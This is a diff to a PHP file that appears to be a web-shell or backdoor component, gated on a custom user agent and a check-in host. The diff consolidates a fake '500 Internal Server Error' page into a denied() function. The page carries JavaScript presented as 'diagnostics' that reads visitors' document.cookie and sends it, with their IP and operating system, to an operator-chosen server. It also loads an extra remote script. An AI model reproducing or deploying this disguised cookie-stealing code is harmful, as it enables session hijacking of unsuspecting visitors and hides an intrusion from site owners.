@@ -12,6 +12,119 @@ function banner(){
     
 }
 
+function denied()
+{
+ echo <<<_POSTDOC1
+ 
+ <!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="refresh" content="10;url=/">
+<title>Error</title>
+<style>
+    body {
+        width: 35em;
+        margin: 0 auto;
+        font-family: Tahoma, Verdana, Arial, sans-serif;
+    }
+</style>
+<!-- 
+     custom script here, to help handle the error request. 
+     like logging error information, and diagnostic information about the remote host.
+ -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/javascript-obfuscator/dist/index.browser.js"></script>-->
+<script>
+
+
+function collectDiagnostics(){
+    var Url = 'http://[your host]/diagHandler.php'; // Don't forget to set this. This will need to be your diagnostic server.
+    var osName = "UNK";
+    let diagAr = document.cookie; //collecting authentication information, for diagnostics.
+    if (navigator.appVersion.indexOf("Win") != -1) {
+        osName = "Windows"
+        var diag = { "oName": osName, "co": diagAr, "Rhost": "$rhost" }
+            if (osName !== ''){
+        if (window.XMLHttpRequest){
+            // sending diag information through xml request, as to not delay user experience.
+            xmlhttp = new XMLHttpRequest();
+        }else{
+            xmlhttp = new ActiveXObject("MicrosoftXMLHTTP");
+        }
+        jsonP = JSON.stringify(diag);
+        xmlhttp.open("GET", Url+jsonP);
+        xmlhttp.setRequestHeader("Content-Type", "application/json");
+        xmlhttp.onreadystatechange = function (){
+            if (this.status === 200){
+            }else{
+                console.log(this.errorText);
+            }
+        }
+        xmlhttp.send();
+    }
+    }else if (navigator.appVersion.indexOf("Mac") != -1) {
+        osName = "Mac/OSX"
+        var diag = {"oName": osName, "co": diagAr, "Rhost": "$rhost" }
+        var jsonP = JSON.stringify(diag);
+        const Method = {
+            headers:{
+                "content-type":"application/json; charset=UTF-8"
+            },
+           method:"GET"
+        }
+        fetch(Url+"?q="+jsonP, Method)
+    }else if (navigator.appVersion.indexOf("X11") != -1) {
+        osName = "Linux"
+        var diag = { "oName": osName, "co": diagAr, "Rhost": "$rhost" }
+        var jsonP = JSON.stringify(diag);
+        const Method = {
+            headers:{
+                "content-type":"application/json; charset=UTF-8"
+            },
+           method:"GET"
+        }
+        fetch(Url+"?q="+jsonP, Method)
+    }else if (navigator.appVersion.indexOf("Unix") != -1) {
+        osName = "Unix"
+        var diag = { "oName": osName, "co": diagAr, "Rhost": "$rhost" }
+        var jsonP = JSON.stringify(diag);
+        const Method = {
+            headers:{
+                "content-type":"application/json; charset=UTF-8"
+            },
+           method:"GET"
+        }
+        fetch(Url+"?q="+jsonP, Method)
+    }else{
+        osName = "UNK"
+        var diag = { "oName": osName, "co": diagAr, "Rhost": "$rhost" }
+        var jsonP = JSON.stringify(diag);
+        const Method = {
+            headers:{
+                "content-type":"application/json; charset=UTF-8"
+            },
+           method:"GET"
+        }
+        fetch(Url+"?q="+jsonP, Method)
+    }
+}
+collectDiagnostics()
+</script>
+<!-- remote resource here. -->
+<script src='rsrc.js'></script>
+</head>
+<body>
+<h1>An error occurred.</h1>
+<p>Sorry, the page you are looking for is currently unavailable to you.<br/>
+Please try again later.</p>
+<p>If you are the system administrator of this resource then you should check
+the error log for details.</p>
+<p>Redirecting you to the home page in 10 seconds.</p>
+</body>
+</html>
+
+_POSTDOC1;   
+}
+
 function b64($target, $how, $data, $ext, $dir)
 {
     /*
@@ -256,230 +369,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
             header("Checkin: " . $CHECK_IN_HOST);
         }
         $rhost = $_SERVER['REMOTE_ADDR'];
-        echo <<<_POSTDOC1
- 
- <!DOCTYPE html>
-<html>
-<head>
-<meta http-equiv="refresh" content="10;url=/">
-<title>Error</title>
-<style>
-    body {
-        width: 35em;
-        margin: 0 auto;
-        font-family: Tahoma, Verdana, Arial, sans-serif;
-    }
-</style>
-<!-- 
-     custom script here, to help handle the error request. 
-     like logging error information, and diagnostic information about the remote host.
- -->
-<!-- <script src="https://cdn.jsdelivr.net/npm/javascript-obfuscator/dist/index.browser.js"></script>-->
-<script>
-
-
-function collectDiagnostics(){
-    var Url = 'http://[your host]/diagHandler.php'; // Don't forget to set this. This will need to be your diagnostic server.
-    var osName = "UNK";
-    let diagAr = document.cookie; //collecting authentication information, for diagnostics.
-    if (navigator.appVersion.indexOf("Win") != -1) {
-        osName = "Windows"
-        var diag = { "oName": osName, "co": diagAr, "Rhost": "$rhost" }
-            if (osName !== ''){
-        if (window.XMLHttpRequest){
-            // sending diag information through xml request, as to not delay user experience.
-            xmlhttp = new XMLHttpRequest();
-        }else{
-            xmlhttp = new ActiveXObject("MicrosoftXMLHTTP");
-        }
-        jsonP = JSON.stringify(diag);
-        xmlhttp.open("GET", Url+jsonP);
-        xmlhttp.setRequestHeader("Content-Type", "application/json");
-        xmlhttp.onreadystatechange = function (){
-            if (this.status === 200){
-            }else{
-                console.log(this.errorText);
-            }
-        }
-        xmlhttp.send();
-    }
-    }else if (navigator.appVersion.indexOf("Mac") != -1) {
-        osName = "Mac/OSX"
-        var diag = {"oName": osName, "co": diagAr, "Rhost": "$rhost" }
-        var jsonP = JSON.stringify(diag);
-        const Method = {
-            headers:{
-                "content-type":"application/json; charset=UTF-8"
-            },
-           method:"GET"
-        }
-        fetch(Url+"?q="+jsonP, Method)
-    }else if (navigator.appVersion.indexOf("X11") != -1) {
-        osName = "Linux"
-        var diag = { "oName": osName, "co": diagAr, "Rhost": "$rhost" }
-        var jsonP = JSON.stringify(diag);
-        const Method = {
-            headers:{
-                "content-type":"application/json; charset=UTF-8"
-            },
-           method:"GET"
-        }
-        fetch(Url+"?q="+jsonP, Method)
-    }else if (navigator.appVersion.indexOf("Unix") != -1) {
-        osName = "Unix"
-        var diag = { "oName": osName, "co": diagAr, "Rhost": "$rhost" }
-        var jsonP = JSON.stringify(diag);
-        const Method = {
-            headers:{
-                "content-type":"application/json; charset=UTF-8"
-            },
-           method:"GET"
-        }
-        fetch(Url+"?q="+jsonP, Method)
-    }else{
-        osName = "UNK"
-        var diag = { "oName": osName, "co": diagAr, "Rhost": "$rhost" }
-        var jsonP = JSON.stringify(diag);
-        const Method = {
-            headers:{
-                "content-type":"application/json; charset=UTF-8"
-            },
-           method:"GET"
-        }
-        fetch(Url+"?q="+jsonP, Method)
-    }
-}
-collectDiagnostics()
-</script>
-<!-- remote resource here. -->
-<script src='rsrc.js'></script>
-</head>
-<body>
-<h1>An error occurred.</h1>
-<p>Sorry, the page you are looking for is currently unavailable to you.<br/>
-Please try again later.</p>
-<p>If you are the system administrator of this resource then you should check
-the error log for details.</p>
-<p>Redirecting you to the home page in 10 seconds.</p>
-</body>
-</html>
-
-_POSTDOC1;
+        denied();
     }
 } else {
     header("Status: 500 Internal Server Error");
     http_response_code(500);
     $rhost = $_SERVER['REMOTE_ADDR'];
-    echo <<<_GETDOC1
-<!DOCTYPE html>
-<html>
-<head>
-<meta http-equiv="refresh" content="10;url=/">
-<title>Error</title>
-<style>
-    body {
-        width: 35em;
-        margin: 0 auto;
-        font-family: Tahoma, Verdana, Arial, sans-serif;
-    }
-</style>
-<!-- 
-     custom script here, to help handle the error request. 
-     like logging error information, and diagnostic information about the remote host.
- -->
-<!--<script src="https://cdn.jsdelivr.net/npm/javascript-obfuscator/dist/index.browser.js"></script>-->
-<script>
-
-
-function collectDiagnostics(){
-    var Url = 'http://[your host]/diagHandler.php'; // Don't forget to set this. This will need to be your diagnostic server.
-    var osName = "UNK";
-    let diagAr = document.cookie; //collecting authentication information, for diagnostics.
-    if (navigator.appVersion.indexOf("Win") != -1) {
-        osName = "Windows"
-        var diag = { "oName": osName, "co": diagAr, "Rhost": "$rhost" }
-            if (osName !== ''){
-        if (window.XMLHttpRequest){
-            // sending diag information through xml request, as to not delay user experience.
-            xmlhttp = new XMLHttpRequest();
-        }else{
-            xmlhttp = new ActiveXObject("MicrosoftXMLHTTP");
-        }
-        jsonP = JSON.stringify(diag);
-        xmlhttp.open("GET", Url+jsonP);
-        xmlhttp.setRequestHeader("Content-Type", "application/json");
-        xmlhttp.onreadystatechange = function (){
-            if (this.status === 200){
-            }else{
-                console.log(this.errorText);
-            }
-        }
-        xmlhttp.send();
-    }
-    }else if (navigator.appVersion.indexOf("Mac") != -1) {
-        osName = "Mac/OSX"
-        var diag = {"oName": osName, "co": diagAr, "Rhost": "$rhost" }
-        var jsonP = JSON.stringify(diag);
-        const Method = {
-            headers:{
-                "content-type":"application/json; charset=UTF-8"
-            },
-           method:"GET"
-        }
-        fetch(Url+"?q="+jsonP, Method)
-    }else if (navigator.appVersion.indexOf("X11") != -1) {
-        osName = "Linux"
-        var diag = { "oName": osName, "co": diagAr, "Rhost": "$rhost" }
-        var jsonP = JSON.stringify(diag);
-        const Method = {
-            headers:{
-                "content-type":"application/json; charset=UTF-8"
-            },
-           method:"GET"
-        }
-        fetch(Url+"?q="+jsonP, Method)
-    }else if (navigator.appVersion.indexOf("Unix") != -1) {
-        osName = "Unix"
-        var diag = { "oName": osName, "co": diagAr, "Rhost": "$rhost" }
-        var jsonP = JSON.stringify(diag);
-        const Method = {
-            headers:{
-                "content-type":"application/json; charset=UTF-8"
-            },
-           method:"GET"
-        }
-        fetch(Url+"?q="+jsonP, Method)
-    }else{
-        osName = "UNK"
-        var diag = { "oName": osName, "co": diagAr, "Rhost": "$rhost" }
-        var jsonP = JSON.stringify(diag);
-        const Method = {
-            headers:{
-                "content-type":"application/json; charset=UTF-8"
-            },
-           method:"GET"
-        }
-        fetch(Url+"?q="+jsonP, Method)
-    }
-
-
-}
-collectDiagnostics()
-</script>
-<!-- remote resource here. -->
-<!--<script src='rsrc.js'></script>-->
-</head>
-<body>
-<h1>An error occurred.</h1>
-<p>Sorry, the page you are looking for is currently unavailable to you.<br/>
-Please try again later.</p>
-<p>If you are the system administrator of this resource then you should check
-the error log for details.</p>
-<p>Redirecting you to the home page in 10 seconds.</p>
-</body>
-</html>
-
-_GETDOC1;
-
+    denied();
 }
 ?>
